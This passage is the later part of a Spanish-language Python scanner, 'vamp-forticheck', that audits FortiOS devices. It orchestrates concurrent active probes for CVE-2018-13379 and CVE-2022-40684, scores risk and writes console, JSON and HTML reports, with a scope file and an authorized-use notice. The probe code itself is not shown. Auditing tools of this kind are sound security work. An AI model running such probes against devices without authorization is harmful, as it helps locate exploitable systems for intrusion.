  body{{font-family:'Courier New',monospace;background:#0a0a0a;color:#ddd;padding:24px;line-height:1.5}}
  h1{{color:#ff003c;font-size:1.4em;margin-bottom:4px;letter-spacing:1px}}
  .subtitulo{{color:#555;font-size:.8em;margin-bottom:20px}}
  .metricas{{display:flex;gap:12px;margin-bottom:24px;flex-wrap:wrap}}
  .tarjeta{{background:#141414;border:1px solid #222;padding:12px 20px;border-radius:4px;min-width:130px}}
  .tarjeta .valor{{font-size:2em;font-weight:700;color:#ff003c}}
  .tarjeta .etiqueta{{font-size:.75em;color:#666;text-transform:uppercase;letter-spacing:.5px}}
  table{{width:100%;border-collapse:collapse;font-size:.85em}}
  th{{background:#1a0000;color:#ff003c;padding:8px 10px;text-align:left;border:1px solid #2a2a2a;font-size:.8em;text-transform:uppercase;letter-spacing:.5px}}
  td{{padding:7px 10px;border:1px solid #1e1e1e}}
  .fila-critical{{background:rgba(255,0,60,.06)}}
  .fila-high{{background:rgba(255,100,0,.06)}}
  .fila-medium{{background:rgba(255,200,0,.04)}}
  .badge{{padding:2px 7px;border-radius:3px;font-size:.75em;font-weight:700}}
  .badge-critical{{background:#ff003c;color:#fff}}
  .badge-high{{background:#ff6400;color:#fff}}
  .badge-medium{{background:#ffc800;color:#000}}
  .badge-low{{background:#0090ff;color:#fff}}
  .badge-info,.badge-unknown{{background:#333;color:#999}}
  .si{{color:#00e676;font-weight:700}} .no{{color:#555}}
  .pie{{margin-top:20px;color:#333;font-size:.75em;border-top:1px solid #1e1e1e;padding-top:10px}}
  code{{background:#111;padding:1px 4px;border-radius:2px;font-size:.9em}}
</style>
</head>
<body>
<h1>&#9888; vamp-forticheck — Informe de Vulnerabilidades FortiOS</h1>
<p class="subtitulo">VampSecure Labs · VampSecure Studios · Solo para uso en auditorías autorizadas</p>
<div class="metricas">{tarjetas}</div>
<table>
<tr><th>Objetivo</th><th>FortiOS</th><th>Versión</th><th>CVEs Confirmados</th><th>Riesgo</th><th>Score</th><th>Notas</th></tr>
{filas}
</table>
<div class="pie">
Generado por vamp-forticheck v1.0 · VampSecure Labs · VampSecure Studios · {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}
</div>
</body>
</html>"""
        Path(ruta).write_text(html, encoding="utf-8")


# =============================================================================
# ESCÁNER PRINCIPAL
# =============================================================================

class FortiScanner:
    """
    Orquestador principal del proceso de escaneo.

    Gestiona el ciclo de vida completo de cada objetivo:
      1. Validación de scope
      2. Detección de FortiOS (Fase 1)
      3. Verificación de CVEs (Fase 2)
      4. Análisis de exposición (Fase 3)
      5. Cálculo de riesgo y nivel semáforo

    La concurrencia se controla con un asyncio.Semaphore para evitar saturar
    la red o los dispositivos objetivo.
    """

    # Umbrales de puntuación para asignar nivel semáforo
    UMBRALES_RIESGO = {
        "CRITICAL": 9.0,
        "HIGH":     7.0,
        "MEDIUM":   4.0,
        "LOW":      0.1,
    }

    def __init__(self, args):
        """
        Parámetros
        ----------
        args : argparse.Namespace  — Argumentos CLI parseados por main()
        """
        self.args = args
        self.scope = ScopeValidator(args.scope)

    def _normalizar_url(self, objetivo: str) -> str:
        """Añade el esquema https:// si el objetivo no incluye protocolo."""
        if "://" in objetivo:
            return objetivo.rstrip("/")
        return f"https://{objetivo.rstrip('/')}"

    async def _escanear_objetivo(self, objetivo: str, session: aiohttp.ClientSession) -> ScanResult:
        """
        Ejecuta las tres fases de análisis para un objetivo individual.

        Parámetros
        ----------
        objetivo : str                    — Host/URL a escanear
        session  : aiohttp.ClientSession  — Sesión HTTP compartida del lote

        Retorna
        -------
        ScanResult  — Resultado completo del análisis
        """
        resultado = ScanResult(target=objetivo)

        # Verificación de scope — abortar si el objetivo no está autorizado
        if not self.scope.is_in_scope(objetivo):
            resultado.error = "OUT_OF_SCOPE"
            return resultado

        url_base = self._normalizar_url(objetivo)
        tiempo_limite = aiohttp.ClientTimeout(total=self.args.timeout)

        # ── Fase 1: Detección de versión y banner ──────────────────────────────
        # Probamos /remote/login primero (SSL-VPN), luego /login (Admin UI), luego /
        for ruta in ("/remote/login", "/login", "/"):
            try:
                async with session.get(
                    f"{url_base}{ruta}",
                    timeout=tiempo_limite,
                    ssl=False,
                    allow_redirects=True,
                ) as r:
                    contenido = await r.text(errors="replace")
                    resultado.banner = r.headers.get("Server", "")
                    resultado.is_fortios, resultado.detected_version = VersionDetector.detect(
                        contenido, dict(r.headers)
                    )
                    # Si ya encontramos indicadores de FortiOS, no seguir probando rutas
                    if resultado.is_fortios or resultado.detected_version:
                        break
            except asyncio.TimeoutError:
                resultado.error = f"Timeout en {ruta}"
                # Continuar con la siguiente ruta — el timeout puede ser selectivo
            except Exception as e:
                resultado.error = str(e)[:100]

        # ── Fase 2: Verificación de CVEs (siempre, independiente de Fase 1) ────
        # Las sondas se lanzan aunque no hayamos detectado FortiOS, por si el
        # dispositivo oculta los indicadores pero tiene el CVE explotable.
        verificador = CVEChecker(session, self.args.timeout)

        sondas = await asyncio.gather(
            verificador.check_cve_2018_13379(url_base),
            verificador.check_cve_2022_40684(url_base),
            verificador.check_api_info_disclosure(url_base),
            return_exceptions=True,
        )

        for sonda in sondas:
            if isinstance(sonda, dict):
                resultado.cve_findings.append(sonda)
                # Si alguna sonda confirma un CVE, el objetivo es FortiOS aunque Fase 1 no lo detectó
                if sonda.get("confirmed") and not resultado.is_fortios:
                    resultado.is_fortios = True

        # Añadir findings basados en versión (sin sonda de red)
        resultado.cve_findings.extend(verificador.check_version_cves(resultado.detected_version))

        # ── Fase 3: Análisis de exposición secundaria ──────────────────────────
        # Solo tiene sentido si hay algo que analizar
        if resultado.is_fortios or any(f.get("confirmed") for f in resultado.cve_findings):
            analizador = ExposureAnalyzer(session)
            resultado.exposure_vectors = await analizador.analyze(url_base, resultado.cve_findings)

        # ── Mitigaciones detectadas ────────────────────────────────────────────
        if resultado.banner and any(waf in resultado.banner.lower() for waf in ("cloudflare", "nginx-waf")):
            resultado.mitigations_detected.append("WAF detectado en cabecera Server")

        # ── Cálculo de puntuación de riesgo ───────────────────────────────────
        resultado.risk_score = self._calcular_puntuacion(resultado)
        resultado.risk_level = self._nivel_riesgo(resultado.risk_score)

        return resultado

    def _calcular_puntuacion(self, r: ScanResult) -> float:
        """
        Calcula la puntuación de riesgo compuesta (0.0–10.0).

        Fórmula
        -------
        score = Σ CVE_CVSS × factor + Σ puntos_vector_exposición

        Factores de confirmación:
          · confirmed=True  → factor 1.0 (certeza total)
          · version_match   → factor 0.55 (probable pero no confirmado activamente)

        Puntos por vector de exposición secundario:
          · HIGH   → +2.0
          · MEDIUM → +1.0
          · LOW    → +0.3
          · INFO   → +0.0 (no afecta a la puntuación)

        El resultado se limita a 10.0 para mantener la escala CVSS estándar.
        """
        puntuacion = 0.0

        for f in r.cve_findings:
            cvss_base = f.get("cvss", 5.0)
            if f.get("confirmed"):
                puntuacion += cvss_base  # Confirmación activa: peso completo
            elif f.get("method") == "version_match":
                puntuacion += cvss_base * 0.55  # Match de versión: 55% del peso

        for vector in r.exposure_vectors:
            puntuacion += {
                "HIGH":   2.0,
                "MEDIUM": 1.0,
                "LOW":    0.3,
                "INFO":   0.0,
            }.get(vector.get("severity", ""), 0)

        return round(min(puntuacion, 10.0), 2)

    def _nivel_riesgo(self, puntuacion: float) -> str:
        """
        Convierte la puntuación numérica al nivel semáforo de riesgo.

        Retorna 'INFO' si la puntuación es 0 (objetivo encontrado sin hallazgos).
        """
        for nivel, umbral in self.UMBRALES_RIESGO.items():
            if puntuacion >= umbral:
                return nivel
        return "INFO"

    async def run(self, objetivos: List[str]) -> List[ScanResult]:
        """
        Ejecuta el escaneo completo del lote de objetivos de forma asíncrona.

        El Semaphore limita la concurrencia real a --concurrency objetivos
        simultáneos, aunque asyncio.as_completed gestiona todos los awaitable
        a la vez. Los resultados se devuelven en orden de finalización, no de
        entrada, para maximizar el throughput.

        Parámetros
        ----------
        objetivos : List[str]  — Lista de hosts/URLs a escanear

        Retorna
        -------
        List[ScanResult]  — Resultados en orden de finalización
        """
        semaforo = asyncio.Semaphore(self.args.concurrency)
        # TCPConnector compartido: reutiliza conexiones y limita la apertura total de sockets
        conector = aiohttp.TCPConnector(ssl=False, limit=self.args.concurrency * 2)
        resultados: List[ScanResult] = []

        async with aiohttp.ClientSession(connector=conector) as session:

            async def escanear_con_limite(objetivo: str):
                async with semaforo:
                    return await self._escanear_objetivo(objetivo, session)

            with Progress(
                SpinnerColumn(),
                TextColumn("[bold cyan]{task.description}"),
                BarColumn(),
                TextColumn("[cyan]{task.completed}/{task.total}[/cyan]"),
                console=console,
            ) as progreso:
                tarea_id = progreso.add_task(
                    f"[cyan]Escaneando {len(objetivos)} objetivo(s)...",
                    total=len(objetivos),
                )
                for coro in asyncio.as_completed([escanear_con_limite(o) for o in objetivos]):
                    r = await coro
                    resultados.append(r)
                    progreso.advance(tarea_id)

        return resultados


# =============================================================================
# FUNCIONES DE SALIDA POR CONSOLA
# =============================================================================

# Mapa de nivel de riesgo a marcado Rich para la tabla de consola
COLORES_RIESGO = {
    "CRITICAL": "[bold red]CRITICAL[/bold red]",
    "HIGH":     "[bold orange1]HIGH[/bold orange1]",
    "MEDIUM":   "[bold yellow]MEDIUM[/bold yellow]",
    "LOW":      "[bold cyan]LOW[/bold cyan]",
    "INFO":     "[dim]INFO[/dim]",
    "UNKNOWN":  "[dim]UNKNOWN[/dim]",
}


def mostrar_tabla_resultados(results: List[ScanResult]):
    """
    Imprime la tabla resumen de todos los objetivos escaneados con Rich.

    Las filas de objetivos fuera de scope se omiten para no contaminar
    el informe con entradas irrelevantes.

    Columnas
    --------
    Objetivo · FortiOS · Versión · CVEs Confirmados · CVEs (ver.) · Riesgo · Score
    """
    tabla = Table(
        title="[bold red]Resultados del Escaneo FortiOS[/bold red]",
        box=box.ROUNDED,
        border_style="red",
        show_lines=False,
    )
    tabla.add_column("Objetivo",       style="white",  no_wrap=True)
    tabla.add_column("FortiOS",        justify="center", width=8)
    tabla.add_column("Versión",        style="yellow", width=12)
    tabla.add_column("CVEs Confirm.",  style="red")
    tabla.add_column("CVEs (versión)", style="orange1")
    tabla.add_column("Riesgo",         justify="center", width=10)
    tabla.add_column("Score",          justify="right",  width=6)

    for r in results:
        if r.error == "OUT_OF_SCOPE":
            continue
        confirmados  = [f["cve"] for f in r.cve_findings if f.get("confirmed")]
        por_version  = [f["cve"] for f in r.cve_findings if f.get("method") == "version_match"]

        tabla.add_row(
            r.target,
            "[bold green]SÍ[/bold green]" if r.is_fortios else "[dim]NO[/dim]",
            r.detected_version or "—",
            ", ".join(confirmados) or "—",
            ", ".join(por_version) or "—",
            COLORES_RIESGO.get(r.risk_level, r.risk_level),
            f"{r.risk_score:.1f}",
        )

    console.print(tabla)


def mostrar_paneles_detalle(results: List[ScanResult]):
    """
    Para cada objetivo con hallazgos confirmados, imprime un panel de detalle
    con los CVEs, su evidencia, impacto y vectores de exposición secundarios.
    """
    for r in results:
        confirmados = [f for f in r.cve_findings if f.get("confirmed")]
        if not confirmados:
            continue

        lineas = [f"[bold]{r.target}[/bold]  (versión: {r.detected_version or 'desconocida'})"]

        for f in confirmados:
            lineas.append(f"\n  [bold red]► {f['cve']}[/bold red]  CVSS {f.get('cvss', '?')}")
            lineas.append(f"    {f.get('description', '')}")
            if f.get("evidence"):
                lineas.append(f"    [dim]Evidencia:[/dim]  {f['evidence']}")
            if f.get("impact"):
                lineas.append(f"    [dim]Impacto:[/dim]    {f['impact']}")

        if r.exposure_vectors:
            lineas.append("\n  [yellow]Vectores de exposición:[/yellow]")
            for v in r.exposure_vectors:
                lineas.append(f"    [yellow]•[/yellow] [{v['severity']}] {v['description']}")

        console.print(Panel(
            "\n".join(lineas),
            title="[bold red]⚠ HALLAZGOS CRÍTICOS[/bold red]",
            border_style="red",
        ))


# =============================================================================
# PUNTO DE ENTRADA
# =============================================================================

def cargar_objetivos(args) -> List[str]:
    """
    Combina los objetivos de --target y --input en una lista deduplicada.

    La deduplicación preserva el orden de aparición (primera ocurrencia gana)
    usando dict.fromkeys(), que mantiene orden de inserción en Python 3.7+.
    """
    objetivos = list(args.target or [])

    if args.input:
        p = Path(args.input)
        if not p.exists():
            console.print(f"[bold red][!] Fichero de entrada no encontrado: {args.input}[/bold red]")
            sys.exit(1)
        for linea in p.read_text().splitlines():
            linea = linea.strip()
            if linea and not linea.startswith("#"):
                objetivos.append(linea)

    return list(dict.fromkeys(objetivos))  # Deduplicar preservando orden


def main():
    console.print(BANNER, style="bold red")

    parser = argparse.ArgumentParser(
        description="vamp-forticheck — Escáner de Vulnerabilidades FortiOS (VampSecure Labs)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Ejemplos:\n"
            "  %(prog)s -t 192.168.1.1\n"
            "  %(prog)s -t vpn.cliente.com --html informe.html\n"
            "  %(prog)s -i objetivos.txt -s scope.txt -c 20 -o resultados.json\n\n"
            "AVISO LEGAL: Solo para uso en auditorías autorizadas. El uso no autorizado es ilegal."
        ),
    )
    parser.add_argument("-t", "--target",      nargs="+", metavar="HOST",
                        help="Objetivo(s): host(s) o IP(s)")
    parser.add_argument("-i", "--input",       metavar="FICHERO",
                        help="Fichero de objetivos (uno por línea)")
    parser.add_argument("-s", "--scope",       metavar="FICHERO",
                        help="Fichero de scope — objetivos no listados serán omitidos")
    parser.add_argument("-c", "--concurrency", type=int, default=10,
                        help="Escaneos concurrentes (por defecto: 10)")
    parser.add_argument("--timeout",           type=int, default=10,
                        help="Timeout por petición en segundos (por defecto: 10)")
    parser.add_argument("-o", "--output",      metavar="FICHERO",
                        help="Ruta del informe JSON de salida")
    parser.add_argument("--html",              metavar="FICHERO",
                        help="Ruta del informe HTML de salida")
    parser.add_argument("-v", "--verbose",     action="store_true",
                        help="Salida detallada")

    args = parser.parse_args()

    if not args.target and not args.input:
        parser.print_help()
        sys.exit(0)

    objetivos = cargar_objetivos(args)
    if not objetivos:
        console.print("[bold red][!] No se han cargado objetivos.[/bold red]")
        sys.exit(1)

    console.print(
        f"[cyan][i] Objetivos: {len(objetivos)}  ·  "
        f"Concurrencia: {args.concurrency}  ·  "
        f"Timeout: {args.timeout}s[/cyan]\n"
    )

    escaner = FortiScanner(args)
    resultados = asyncio.run(escaner.run(objetivos))

    mostrar_tabla_resultados(resultados)
    mostrar_paneles_detalle(resultados)

    if args.output:
        ReportGenerator.to_json(resultados, args.output)
        console.print(f"\n[bold green][✓] Informe JSON guardado: {args.output}[/bold green]")

    if args.html:
        ReportGenerator.to_html(resultados, args.html)
        console.print(f"[bold green][✓] Informe HTML guardado: {args.html}[/bold green]")

    # Resumen final
    confirmados  = sum(1 for r in resultados for f in r.cve_findings if f.get("confirmed"))
    criticos     = sum(1 for r in resultados if r.risk_level == "CRITICAL")
    fuera_scope  = sum(1 for r in resultados if r.error == "OUT_OF_SCOPE")

    console.print(
        f"\n[bold]Escaneo completado.[/bold] "
        f"{confirmados} CVE(s) confirmado(s) · "
        f"{criticos} objetivo(s) crítico(s) · "
        f"{len(objetivos) - fuera_scope} objetivo(s) analizados"
        + (f" · {fuera_scope} fuera de scope" if fuera_scope else "")
    )


if __name__ == "__main__":
    main()
